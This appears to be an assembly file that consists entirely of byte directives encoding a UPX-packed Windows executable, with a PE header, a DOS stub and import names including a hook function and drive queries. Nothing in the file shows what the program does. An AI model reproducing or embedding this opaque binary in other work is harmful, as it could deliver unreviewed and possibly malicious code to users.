  db 0,16,2,0,0,16,0,0,0,0,0,0,2,0,0,0
  db 0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0
  db 0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,2,0,232,1,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,85,80,88,48,0,0,0,0
  db 0,192,1,0,0,16,0,0,0,0,0,0,0,4,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,128,0,0,224
  db 85,80,88,49,0,0,0,0,0,48,0,0,0,208,1,0
  db 0,36,0,0,0,4,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,64,0,0,224,85,80,88,50,0,0,0,0
  db 0,16,0,0,0,0,2,0,0,2,0,0,0,40,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,192
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,49,46,50,51,0
  db 85,80,88,33,12,9,2,8,175,233,133,239,104,160,181,151
  db 81,216,1,0,45,34,0,0,0,92,0,0,38,1,0,158
  db 223,91,254,255,106,3,232,1,0,59,88,199,5,79,148,64
  db 0,148,0,104,8,19,22,223,255,238,230,131,61,95,2,117
  db 79,13,58,212,104,2,195,65,0,106,40,80,26,190,92,190
  db 221,237,104,144,97,25,104,156,4,106,0,63,184,140,97,175
  db 105,54,179,1,9,152,2,106,1,249,247,142,108,37,140,255
  db 53,63,60,148,104,0,96,99,187,255,158,4,88,20,11,192
  db 117,55,8,50,130,74,58,205,221,125,246,254,163,12,137,25
  db 194,163,16,9,131,37,20,41,65,239,96,239,149,10,14,73
  db 32,1,61,140,172,251,253,255,58,158,85,139,236,131,196,232
  db 255,117,248,141,69,252,17,60,24,82,102,123,118,107,182,119
  db 56,98,41,17,6,84,30,244,80,3,117,111,176,238,240,80
  db 25,1,155,247,198,171,128,177,205,246,253,152,214,199,69,85
  db 19,39,232,236,80,65,96,221,183,153,38,90,240,31,220,68
  db 13,11,183,177,246,237,208,139,32,201,195,51,192,3,125,176
  db 58,208,48,236,62,114,115,242,6,212,3,216,30,18,64,13
  db 220,0,114,251,236,141,224,6,183,143,69,228,22,240,6,59
  db 156,112,54,244,29,248,15,127,49,208,101,192,182,246,68,137
  db 128,2,252,17,62,139,117,199,182,236,145,208,238,86,106,143
  db 8,155,61,108,9,175,172,128,4,207,0,96,62,155,125,219
  db 114,57,246,176,51,176,61,110,248,76,118,216,109,100,180,44
  db 210,116,20,12,104,8,255,221,111,31,2,235,217,222,188,201
  db 194,16,0,220,129,196,0,254,255,255,131,125,12,240,159,251
  db 27,8,47,104,222,192,173,222,125,36,56,255,21,240,117,158
  db 61,219,142,93,31,217,218,232,10,58,188,176,80,233,115,161
  db 208,221,4,3,19,52,1,136,192,143,150,239,125,174,123,141
  db 13,115,24,149,139,11,129,81,4,42,3,107,187,177,140,114
  db 116,206,136,19,37,97,51,220,157,225,92,163,28,48,12,143
  db 5,24,8,142,217,220,247,109,80,5,114,141,4,169,27,133
  db 236,187,173,97,187,235,79,129,107,18,122,117,187,68,10,19
  db 1,247,238,183,53,16,8,16,78,117,50,44,7,169,235,43
  db 24,237,221,183,102,13,4,13,221,16,139,77,20,21,53,167
  db 235,21,68,225,61,91,182,20,2,16,12,118,57,252,248,217
  db 216,118,183,153,254,117,225,98,189,116,4,15,28,217,94,107
  db 238,139,212,219,65,1,145,21,14,220,35,75,247,216,161,251
  db 215,65,8,12,255,16,101,100,121,46,3,216,20,7,24,89
  db 70,150,145,11,28,15,32,19,9,228,230,130,24,165,19,23
  db 216,65,101,228,141,127,119,104,40,218,65,204,1,1,0,138
  db 221,223,24,238,15,133,75,236,200,2,18,204,163,184,137,64
  db 217,124,239,241,15,132,47,3,104,140,41,168,132,28,188,212
  db 189,189,139,64,12,139,4,0,163,192,37,102,161,188,219,65
  db 237,220,253,219,106,25,35,174,102,163,190,21,106,16,104,59
  db 15,166,231,123,72,101,162,224,27,60,104,240,10,102,251,61
  db 50,50,48,32,15,197,17,181,198,109,195,182,69,10,71,229
  db 4,112,17,31,106,64,109,115,159,245,222,48,120,16,17,112
  db 163,35,179,138,30,222,179,20,68,81,53,16,96,240,179,237
  db 96,151,47,12,161,12,54,205,46,80,26,185,108,251,101,122
  db 198,131,248,255,183,89,123,53,10,105,110,230,73,79,3,216
  db 91,60,35,7,22,70,2,7,109,224,169,13,148,187,11,130
  db 7,13,31,217,123,49,205,71,38,51,53,52,48,148,205,30
  db 237,146,1,45,35,1,124,56,146,231,225,201,31,255,125,24
  db 76,201,20,214,172,44,166,161,31,223,30,123,79,181,61,184
  db 11,104,118,6,255,5,152,80,17,30,254,101,205,89,3,200
  db 137,13,208,230,4,169,141,246,17,132,81,164,31,241,14,24
  db 177,239,151,153,204,46,139,200,139,61,17,139,102,247,247,34
  db 219,243,164,127,15,19,55,130,104,219,132,121,9,239,178,15
  db 161,9,55,204,219,128,92,114,10,131,0,212,46,123,135,45
  db 158,192,159,171,95,118,164,67,59,53,106,120,9,76,115,88
  db 187,63,120,116,55,161,22,57,5,216,13,117,35,133,245,67
  db 224,166,14,2,106,5,25,192,104,147,150,37,233,252,158,147
  db 134,163,42,131,37,179,236,32,124,147,118,156,4,132,163,116
  db 51,127,132,5,249,28,26,195,27,218,21,193,98,109,200,31
  db 75,52,28,221,235,13,132,229,151,28,34,104,212,129,241,225
  db 39,58,164,195,106,126,27,216,234,133,228,221,203,192,4,117
  db 34,24,1,104,39,218,4,190,127,111,234,231,128,61,21,10
  db 117,222,161,54,195,142,50,207,134,114,124,255,188,0,191,174
  db 117,249,93,200,29,125,31,245,141,61,8,120,185,0,43,214
  db 123,203,238,202,243,171,104,13,17,9,188,125,36,6,80,40
  db 180,104,75,146,23,80,104,21,8,31,193,78,6,34,81,16
  db 19,134,111,96,225,88,80,94,8,120,116,70,141,53,219,65
  db 222,127,134,217,141,5,34,229,61,56,192,89,141,185,17,205
  db 29,110,52,45,33,128,39,118,13,4,71,222,61,205,247,96
  db 219,203,52,86,104,186,96,3,25,3,15,18,177,143,77,49
  db 204,104,231,205,114,7,214,50,181,203,227,25,53,107,104,232
  db 165,123,191,2,18,24,64,174,103,54,247,169,125,18,24,127
  db 0,179,151,125,114,123,35,33,227,148,150,106,15,12,186,197
  db 70,12,10,211,120,115,161,248,223,203,130,140,27,144,163,26
  db 141,117,206,139,254,86,137,8,175,237,52,1,86,26,16,120
  db 18,95,120,96,175,127,141,19,172,60,131,215,88,64,64,4
  db 233,255,255,59,198,116,34,87,176,10,106,50,89,242,174,128
  db 103,255,0,95,139,199,48,224,178,223,44,34,10,243,166,11
  db 201,116,23,56,156,92,98,19,193,252,14,8,202,1,177,25
  db 227,161,83,210,119,163,42,90,10,54,194,194,94,236,100,41
  db 168,64,144,195,114,140,47,27,117,3,92,251,86,112,113,178
  db 199,67,69,254,233,120,114,198,64,83,251,147,185,21,149,20
  db 46,141,133,140,252,41,145,13,55,14,33,83,248,24,147,151
  db 93,161,250,231,224,221,6,105,5,171,87,104,254,29,24,206
  db 71,128,63,27,123,95,88,72,250,118,7,62,0,184,34,215
  db 145,166,54,113,97,175,104,13,95,196,169,128,101,195,221,120
  db 214,254,76,139,247,98,185,250,109,103,130,217,86,66,75,44
  db 151,79,173,224,232,70,67,115,198,86,207,133,126,183,240,43
  db 198,6,32,25,149,71,59,241,114,30,78,78,15,11,216,118
  db 236,251,32,8,49,3,141,10,80,120,101,109,103,123,67,133
  db 157,198,70,1,119,53,61,63,242,105,120,179,93,142,60,36
  db 116,28,12,21,57,103,255,238,27,18,50,9,236,173,13,32
  db 0,151,137,125,251,129,255,105,110,49,129,221,198,102,111,17
  db 213,173,51,219,12,54,7,4,102,120,16,157,1,243,215,27
  db 251,56,92,199,133,103,162,141,9,80,6,69,185,125,103,99
  db 41,178,28,100,252,225,108,231,161,35,100,100,6,104,76,236
  db 236,9,255,200,106,9,104,66,145,230,106,8,90,16,17,235
  db 62,132,87,148,149,104,20,117,34,100,48,236,126,127,237,242
  db 209,12,141,29,120,5,61,190,24,96,86,255,119,177,245,224
  db 6,3,175,6,137,3,198,67,3,32,131,195,4,235,254,151
  db 183,183,17,17,5,116,5,22,2,117,7,171,79,176,32,170
  db 131,198,4,128,2,67,232,23,180,117,207,97,87,83,35,71
  db 203,158,123,195,111,223,235,5,104,122,6,152,188,188,145,222
  db 225,104,133,105,33,223,237,161,9,8,8,111,9,186,13,63
  db 187,15,200,67,34,160,15,116,97,163,247,38,139,240,197,254
  db 28,219,51,255,19,87,135,42,102,139,198,69,176,24,124,220
  db 176,118,37,104,94,86,26,22,253,31,176,110,80,93,86,88
  db 88,3,240,71,131,255,35,117,190,67,129,108,96,178,96,192
  db 112,247,215,11,183,101,135,152,170,20,11,219,185,60,242,220
  db 114,180,253,195,23,179,202,102,118,245,47,92,78,12,233,30
  db 43,224,108,111,103,111,117,113,185,238,194,70,195,248,143,33
  db 49,10,191,6,10,63,205,79,243,235,60,60,50,12,49,60
  db 51,5,38,60,52,141,20,246,52,4,27,85,64,15,110,36
  db 99,26,160,251,162,14,110,23,254,96,120,109,115,103,32,117
  db 73,188,231,210,174,172,170,178,185,209,59,170,250,50,192,170
  db 245,19,47,4,118,15,97,179,5,88,201,100,105,114,233,195
  db 49,182,33,240,218,97,188,254,186,185,104,197,201,114,119,63
  db 176,137,133,184,16,141,189,232,5,130,91,110,180,26,10,148
  db 71,120,30,247,47,90,102,251,17,155,116,6,17,114,150,71
  db 182,238,13,101,255,181,220,21,86,76,232,189,104,174,134,125
  db 97,118,20,235,29,33,252,99,102,96,101,30,254,13,41,130
  db 13,140,23,26,40,162,182,143,190,215,65,152,163,182,63,90
  db 18,255,110,124,132,75,170,76,60,82,69,80,174,32,0,74
  db 33,151,203,229,119,21,1,210,131,0,91,167,67,232,131,251
  db 169,97,33,79,215,59,109,34,78,107,45,141,172,67,21,236
  db 156,110,66,235,106,43,176,4,78,155,28,204,40,48,2,200
  db 5,25,6,153,96,233,114,99,100,117,121,217,28,6,156,61
  db 3,90,61,185,112,102,93,126,6,251,248,74,14,24,1,194
  db 26,27,136,99,3,222,66,0,186,27,108,246,69,82,32,81
  db 105,115,116,161,18,242,233,220,102,98,246,17,228,104,128,223
  db 54,11,40,35,167,28,16,117,127,221,238,235,124,4,9,112
  db 38,21,252,15,190,10,139,14,227,102,172,165,220,117,81,66
  db 219,31,73,46,219,30,158,237,100,139,216,43,1,116,56,83
  db 46,0,128,67,198,177,191,131,232,4,120,68,255,54,20,104
  db 245,136,16,241,190,131,140,184,135,185,239,191,56,223,6,34
  db 125,247,83,101,32,129,254,18,15,190,71,59,195,142,120,102
  db 214,17,133,44,28,146,96,54,186,14,138,129,50,72,108,180
  db 135,247,88,46,213,140,253,40,141,9,167,103,115,219,147,180
  db 59,52,10,148,17,23,176,217,40,105,101,150,31,78,121,152
  db 53,12,58,146,173,14,242,116,90,184,255,3,107,105,108,108
  db 117,123,70,185,40,152,161,126,227,75,45,111,215,198,71,254
  db 0,66,45,117,1,70,86,225,5,111,255,78,48,128,126,255
  db 12,2,247,216,204,76,217,207,80,14,46,66,13,106,80,249
  db 132,23,8,221,88,21,24,247,235,22,244,76,221,254,137,99
  db 118,114,116,117,63,70,125,185,232,171,223,153,161,195,130,104
  db 144,46,86,195,10,108,252,34,51,70,115,114,118,108,23,203
  db 60,135,141,204,74,14,32,255,145,140,29,18,221,57,78,247
  db 57,18,139,132,92,229,129,14,231,2,109,225,129,36,100,115
  db 212,190,11,238,126,154,187,20,14,119,51,50,48,5,190,59
  db 6,102,129,15,247,52,240,214,39,4,63,45,114,251,1,19
  db 13,161,155,99,205,115,2,37,191,3,137,53,34,149,22,217
  db 153,91,5,61,38,100,32,91,214,171,50,179,92,115,148,183
  db 35,49,144,11,230,232,7,48,33,46,69,210,169,103,255,178
  db 159,168,228,162,144,107,196,148,156,40,228,100,34,38,8,217
  db 15,12,102,116,117,112,78,88,172,173,154,198,242,76,81,59
  db 212,107,148,44,82,75,134,12,51,168,137,87,9,175,13,161
  db 22,109,107,13,204,177,35,123,117,83,70,209,106,122,58,128
  db 91,163,41,18,113,102,248,210,115,18,210,171,101,89,191,132
  db 94,53,27,175,206,237,30,79,10,163,173,75,14,177,37,235
  db 245,115,42,126,83,60,176,85,178,46,200,248,104,118,191,219
  db 88,12,12,86,13,244,117,225,32,137,110,28,105,176,175,85
  db 200,115,180,23,0,213,242,75,73,115,114,109,81,211,59,70
  db 100,11,125,80,114,101,110,113,95,210,31,148,140,93,87,102
  db 40,100,101,108,25,33,100,45,79,190,145,152,177,64,57,40
  db 119,228,49,207,22,242,52,82,54,131,10,104,44,255,192,58
  db 161,47,10,8,124,101,120,101,99,117,118,39,140,86,2,79
  db 8,227,4,189,224,160,3,85,232,1,104,9,105,145,93,58
  db 249,92,24,137,108,26,32,118,182,146,11,20,78,111,112,117
  db 209,145,1,9,98,241,177,43,24,130,180,118,15,113,100,20
  db 59,94,167,235,23,104,128,7,25,160,9,134,4,216,170,78
  db 156,98,132,65,134,234,111,207,17,82,13,187,101,83,230,200
  db 211,208,237,61,32,161,107,118,34,121,82,197,104,120,72,92
  db 83,67,25,173,8,240,230,50,226,172,144,86,230,158,136,142
  db 206,16,208,65,22,229,86,217,223,39,113,222,46,64,128,61
  db 11,255,116,18,8,8,179,125,242,254,116,9,239,117,48,72
  db 192,121,26,102,203,11,106,183,84,23,86,177,255,11,235,96
  db 87,139,206,131,225,127,139,62,0,13,187,208,133,25,95,227
  db 246,187,106,65,189,148,178,128,42,88,117,42,116,11,18,90
  db 20,146,200,107,160,74,89,126,149,16,156,102,112,117,116,56
  db 97,207,80,198,30,52,87,19,117,46,236,115,32,139,223,20
  db 11,12,120,111,185,24,235,211,95,143,1,192,204,93,66,223
  db 198,30,63,136,19,31,94,139,127,109,1,179,46,83,106,21
  db 87,224,21,133,230,110,250,40,18,43,91,163,231,23,138,23
  db 167,225,237,237,51,201,73,91,253,176,92,4,252,71,71,75
  db 55,25,30,74,200,56,105,162,87,32,88,152,145,162,51,18
  db 0,205,182,94,131,80,94,61,205,11,73,244,109,203,70,19
  db 189,147,0,44,205,135,69,178,160,178,119,115,100,137,24,32
  db 164,146,1,13,129,128,96,198,206,50,14,191,58,51,118,217
  db 102,36,34,15,67,32,26,176,148,217,38,132,167,239,227,13
  db 210,139,167,51,187,143,43,83,29,15,249,52,42,1,192,87
  db 117,66,255,50,43,171,133,60,147,115,172,145,45,158,111,79
  db 211,187,172,64,11,132,179,61,28,134,153,128,115,54,195,73
  db 189,104,136,189,239,47,182,132,187,99,133,65,42,73,163,116
  db 31,57,20,137,126,114,22,123,52,42,37,128,59,124,235,190
  db 132,203,26,201,12,197,61,12,102,213,4,25,5,142,104,133
  db 60,156,140,131,45,35,0,112,118,92,8,247,131,165,120,96
  db 65,122,159,121,128,59,125,131,109,3,249,128,39,67,193,91
  db 199,3,80,179,112,86,243,232,24,83,15,244,2,124,15,215
  db 240,13,133,139,123,8,11,140,196,31,141,247,45,70,190,46
  db 12,183,252,3,127,3,116,109,68,73,223,98,105,127,4,83
  db 64,176,4,104,122,175,167,45,38,123,193,142,220,14,130,162
  db 192,222,44,102,10,162,23,151,32,11,179,243,255,133,125,39
  db 124,128,127,101,199,250,136,58,236,27,10,117,60,80,192,145
  db 176,192,79,213,88,85,59,216,101,74,18,241,61,3,25,142
  db 112,153,185,216,133,47,95,238,238,235,81,167,97,169,15,44
  db 105,199,45,237,8,79,89,177,144,16,168,235,93,235,64,104
  db 144,20,74,143,86,178,217,5,62,65,3,46,99,226,25,244
  db 11,245,164,94,3,252,161,58,235,175,254,110,138,24,185,85
  db 139,125,8,120,170,44,94,224,193,127,3,248,79,17,92,117
  db 250,141,5,96,246,126,103,56,31,117,246,46,123,30,253,251
  db 218,11,167,134,60,56,95,18,87,242,136,139,77,252,60,82
  db 117,181,17,57,145,206,203,104,217,97,146,188,228,6,56,16
  db 108,16,108,253,197,132,240,25,11,5,179,201,194,8,8,67
  db 196,184,51,48,16,102,200,93,194,205,70,173,74,183,180,75
  db 220,5,4,56,249,86,165,11,203,65,0,50,19,81,239,77
  db 118,231,208,17,26,12,35,55,201,27,208,98,106,37,46,195
  db 65,53,13,180,83,76,138,20,19,172,9,24,123,86,221,64
  db 94,125,32,24,19,95,225,62,254,104,41,9,108,4,199,8
  db 33,95,244,255,208,195,225,4,133,87,154,50,47,195,179,11
  db 61,147,128,82,178,18,20,148,79,147,130,21,111,75,30,104
  db 36,162,241,173,0,210,21,185,218,158,218,59,129,169,75,163
  db 166,8,4,239,197,14,228,32,3,42,70,19,148,140,120,118
  db 9,110,96,146,51,180,111,192,88,177,200,249,83,131,101,204
  db 27,121,158,136,45,201,15,90,149,196,229,200,65,32,131,204
  db 137,112,98,217,110,141,29,191,29,200,25,204,80,3,208,3
  db 180,134,183,212,80,34,104,200,209,152,193,243,125,54,5,34
  db 117,252,50,172,140,19,242,144,54,50,93,200,80,129,106,139
  db 44,164,195,138,3,233,51,103,37,59,100,91,147,163,42,67
  db 4,43,176,94,35,43,253,44,2,125,36,110,21,56,195,214
  db 114,117,160,211,131,69,98,88,162,212,155,154,184,104,24,140
  db 91,243,216,8,216,236,131,125,120,36,10,116,56,6,16,83
  db 47,202,121,182,183,116,17,30,248,33,18,248,232,218,97,131
  db 189,3,255,69,216,14,154,89,139,18,182,11,152,202,92,61
  db 79,255,1,20,214,130,57,176,95,32,82,220,124,50,80,50
  db 216,1,97,160,55,146,193,204,1,26,91,166,6,50,193,39
  db 77,90,144,0,116,137,197,136,217,93,211,0,184,0,0,188
  db 249,127,115,145,4,200,14,31,186,14,0,180,9,205,33,184
  db 1,76,219,255,239,96,84,45,32,112,114,111,103,114,97,109
  db 32,99,97,110,110,111,235,98,169,191,109,245,101,32,114,117
  db 46,105,2,68,79,83,32,109,111,212,96,255,193,126,46,13
  db 13,10,36,67,113,212,247,219,53,181,153,136,3,143,220,124
  db 119,38,7,201,149,139,136,52,187,170,138,82,105,99,11,117
  db 132,189,104,27,139,80,144,76,254,176,75,193,1,5,33,182
  db 61,19,224,0,14,33,11,193,6,27,91,12,220,8,228,16
  db 3,123,179,177,177,32,34,16,11,2,26,0,7,103,110,73
  db 55,12,96,30,52,16,179,240,108,96,7,6,224,49,47,156
  db 38,6,201,194,48,44,60,10,69,194,0,217,72,0,0,48
  db 139,123,167,219,224,46,116,103,116,164,146,144,179,126,223,45
  db 236,4,35,234,96,46,98,115,115,16,112,2,252,203,5,118
  db 123,128,208,46,114,100,97,116,97,192,146,48,185,124,2,59
  db 2,247,102,179,102,64,46,38,106,160,47,207,242,79,217,12
  db 39,192,46,114,101,108,111,99,104,80,194,78,201,32,14,66
  db 0,0,167,192,21,162,91,69,137,83,37,28,19,165,2,9
  db 193,133,175,66,197,112,125,244,117,32,38,94,26,75,174,169
  db 24,116,20,80,45,116,11,152,130,104,195,123,8,42,232,134
  db 20,252,190,40,252,235,30,37,115,24,196,43,241,6,217,27
  db 4,246,70,88,76,188,19,111,54,97,54,36,105,247,7,153
  db 90,230,120,6,41,8,163,51,182,48,19,174,208,183,94,60
  db 144,177,147,181,15,81,41,14,34,12,95,119,44,62,41,2
  db 195,24,12,34,64,100,51,222,102,83,189,18,228,12,192,40
  db 216,247,164,250,185,9,122,13,39,120,171,228,94,86,173,254
  db 16,136,93,87,83,81,86,82,70,205,190,88,124,10,80,78
  db 57,210,205,108,255,11,246,54,183,27,22,228,90,94,89,91
  db 95,62,8,26,48,87,158,188,250,37,32,240,244,135,26,25
  db 73,218,52,3,71,235,248,13,172,253,111,191,255,92,116,7
  db 198,7,92,128,103,27,70,149,58,27,185,110,194,250,64,232
  db 198,20,228,158,144,238,75,133,252,128,189,238,22,115,31,21
  db 187,224,113,247,48,84,29,154,63,123,200,97,103,238,158,252
  db 235,72,66,163,109,16,14,12,66,240,66,3,169,54,153,187
  db 212,192,104,2,108,23,234,66,143,153,47,11,16,255,181,226
  db 15,255,85,12,154,207,135,122,161,41,188,250,40,204,108,94
  db 104,88,86,18,219,8,138,37,32,48,200,200,200,86,5,4
  db 8,12,200,200,200,200,16,20,24,28,200,200,200,200,0,56
  db 40,44,162,176,204,200,48,52,8,166,89,110,47,80,49,3
  db 200,48,218,234,92,211,52,203,2,49,18,44,68,188,19,108
  db 154,166,251,0,124,23,140,156,176,106,49,203,119,9,131,48
  db 175,92,19,48,164,96,6,51,32,198,231,123,109,49,42,73
  db 12,70,88,187,193,2,91,67,95,115,101,31,11,70,182,183
  db 183,3,114,115,116,4,108,101,65,29,145,78,43,254,103,38
  db 30,16,225,0,71,101,116,67,117,114,187,255,107,254,118,116
  db 68,39,101,99,116,111,114,121,240,23,68,114,105,118,101,84
  db 22,45,154,221,121,112,39,9,1,76,194,112,242,246,118,236
  db 97,108,22,83,116,5,110,103,115,65,62,2,83,116,219,246
  db 4,211,2,108,117,114,46,116,11,220,93,226,255,157,112,23
  db 75,69,82,78,69,76,51,50,43,108,108,222,254,183,189,13
  db 20,0,67,80,108,143,72,111,111,107,69,120,17,219,1,80

  db 115,223,37,222,186,116,77,101,153,97,103,177,16,95,177,217
  db 221,119,89,15,93,111,87,196,111,119,115,51,43,97,238,183
  db 20,129,2,85,110,104,11,22,144,180,178,97,109,83,106,103
  db 0,136,217,226,33,19,48,50,34,1,217,52,91,107,172,3
  db 24,40,191,16,179,108,154,102,98,246,159,59,50,84,237,232
  db 51,77,98,111,57,2,41,75,98,221,182,67,236,114,105,86
  db 160,97,236,104,65,110,17,225,173,13,12,120,101,100,46,102
  db 73,110,40,208,111,215,213,234,75,66,42,0,82,51,70,206
  db 209,86,149,24,83,15,12,0,136,66,154,181,34,25,232,161
  db 52,132,176,109,42,181,135,81,70,2,32,68,255,127,179,76
  db 16,72,8,48,51,48,79,48,106,48,114,48,119,48,131,48
  db 146,255,255,255,255,48,161,48,181,48,196,48,209,48,123,49
  db 213,49,232,49,237,49,254,49,14,50,64,50,70,50,76,50
  db 82,50,88,50,94,40,146,255,255,50,100,50,106,50,112,50
  db 118,50,124,50,130,50,136,50,142,50,134,224,24,141,202,224
  db 245,127,34,102,15,218,228,249,5,31,9,123,65,62,71,95
  db 228,249,232,249,11,18,220,10,241,9,57,159,104,228,191,35
  db 224,247,201,100,73,158,59,142,18,130,113,2,221,138,182,136
  db 64,202,70,19,138,195,92,35,14,130,51,178,243,179,70,80
  db 84,59,28,104,180,16,203,78,17,236,130,11,121,101,75,246
  db 186,101,16,67,65,82,14,133,73,138,111,114,236,250,38,106
  db 2,44,25,209,176,106,172,127,43,136,28,156,156,232,250,7
  db 236,123,42,32,207,169,182,106,8,39,171,161,120,167,172,252
  db 177,141,189,11,204,212,222,109,21,134,166,53,172,170,10,192
  db 11,230,59,117,82,92,145,216,121,245,96,195,62,138,81,17
  db 106,63,21,141,1,204,190,20,122,18,207,81,77,177,43,130
  db 31,132,104,248,37,181,151,173,236,123,160,110,226,127,11,76
  db 130,177,98,115,46,13,0,151,2,104,87,76,104,122,64,106
  db 177,139,216,170,210,167,179,71,104,251,104,134,214,189,22,169
  db 70,138,124,0,198,139,223,81,31,6,9,253,139,200,43,71
  db 71,252,87,104,107,75,71,184,167,129,81,136,38,147,156,66
  db 86,197,14,0,24,234,3,189,199,138,33,80,131,189,177,8
  db 228,22,123,50,186,208,131,165,19,26,224,249,151,241,146,28
  db 224,249,10,24,34,162,109,182,65,85,6,74,183,163,190,7
  db 185,53,235,176,75,97,4,163,236,15,89,158,75,158,75,240
  db 102,244,115,226,100,159,75,248,176,97,90,116,34,203,158,203
  db 150,79,182,31,252,196,15,210,41,54,16,17,88,252,128,36
  db 145,162,20,229,244,251,106,62,208,191,32,208,54,219,67,155
  db 32,57,5,16,227,253,104,43,128,16,145,213,131,61,12,5
  db 118,93,192,123,30,141,141,51,148,42,23,104,144,226,61,25
  db 228,21,35,124,88,163,38,7,189,243,172,44,252,253,17,218
  db 176,3,61,160,74,208,27,97,144,25,123,104,121,96,11,251
  db 209,176,201,102,188,14,42,106,80,35,120,128,11,88,104,17
  db 123,107,179,243,233,114,38,250,251,20,15,207,200,30,146,61
  db 58,98,65,216,250,66,255,172,250,66,2,86,81,139,240,156
  db 138,4,49,60,65,114,237,255,111,255,9,60,90,119,5,4
  db 32,136,12,73,121,237,139,198,89,94,195,81,51,201,65,128
  db 60,35,213,64,76,248,117,249,139,193,89,51,244,51,216,126
  db 11,90,114,39,32,117,1,64,129,6,230,238,182,59,103,9
  db 9,16,13,117,3,26,65,8,8,117,25,183,37,75,212,115
  db 64,255,25,254,13,219,109,224,218,106,107,12,30,146,7,5
  db 57,119,52,21,57,25,27,65,12,90,96,76,183,25,43,5
  db 88,186,114,10,8,192,100,146,67,206,18,219,228,233,82,171
  db 62,57,245,73,116,28,219,210,184,127,191,205,47,254,5,113
  db 128,61,5,70,15,130,28,18,97,211,217,48,31,229,120,70
  db 103,107,191,44,137,222,9,128,37,40,247,106,166,194,4,42
  db 55,58,182,89,145,131,117,190,90,211,237,88,183,63,19,61
  db 96,234,5,118,31,80,80,195,10,11,186,44,96,234,10,82
  db 92,146,128,230,227,91,89,159,83,209,96,63,9,56,91,65
  db 83,104,123,159,139,85,170,247,123,64,187,15,3,29,27,123
  db 109,28,227,187,125,202,96,200,202,134,29,199,180,127,33,91
  db 38,202,78,163,35,125,118,68,239,247,178,141,181,11,129,61
  db 52,188,114,45,22,116,136,206,80,143,217,83,19,50,200,229
  db 123,159,71,107,219,88,220,162,135,16,71,64,241,100,187,156
  db 102,187,219,0,122,157,76,11,193,227,8,8,72,156,179,145
  db 27,106,68,241,72,6,76,111,3,157,13,69,60,114,53,139
  db 141,33,190,12,78,150,73,84,0,67,149,231,242,239,15,209
  db 14,148,2,28,71,54,138,156,40,27,240,38,219,255,136,92
  db 16,4,64,10,219,117,239,82,50,64,38,173,251,174,207,166
  db 86,120,44,73,90,141,130,9,51,80,6,50,114,228,200,8
  db 3,7,2,134,1,5,46,249,92,58,66,4,80,107,107,0
  db 248,32,71,162,96,204,14,232,120,81,82,130,255,55,254,83
  db 139,117,12,139,69,8,196,138,20,1,10,210,117,10,145,91
  db 90,89,223,104,27,239,251,235,44,128,250,142,18,4,141,13
  db 128,234,65,203,203,219,255,179,25,42,218,178,65,2,211,235
  db 21,22,97,114,16,122,119,11,97,214,254,47,35,97,134,20
  db 49,65,235,189,255,37,112,81,117,5,200,200,200,200,92,88
  db 84,80,200,200,200,200,76,72,68,64,200,200,200,200,108,56
  db 52,48,200,200,200,200,44,40,36,32,216,200,200,200,28,60
  db 96,100,119,35,35,223,201,104,80,5,92,96,100,35,35,35
  db 35,104,108,112,116,35,35,35,35,120,124,128,132,35,35,35
  db 35,136,140,144,148,35,35,35,35,152,156,160,164,35,35,35
  db 35,168,172,176,180,35,35,35,35,184,188,192,196,35,35,35
  db 35,200,204,208,212,35,35,35,35,216,220,224,228,35,35,35
  db 35,232,236,64,244,35,35,35,35,248,252,240,84,35,35,35
  db 35,80,76,72,68,35,35,35,35,28,56,52,48,35,35,35
  db 35,44,40,36,32,35,35,35,35,0,24,20,16,35,35,35
  db 35,12,8,4,160,70,70,70,158,81,156,152,148,144,70,70
  db 70,70,140,120,124,128,93,97,70,70,132,136,238,87,253,119
  db 52,74,14,145,142,51,210,138,6,70,60,2,117,18,23,110
  db 251,191,6,247,210,70,235,11,44,48,141,12,137,2,72,21
  db 118,99,238,21,127,241,141,4,17,51,194,95,237,143,65,20
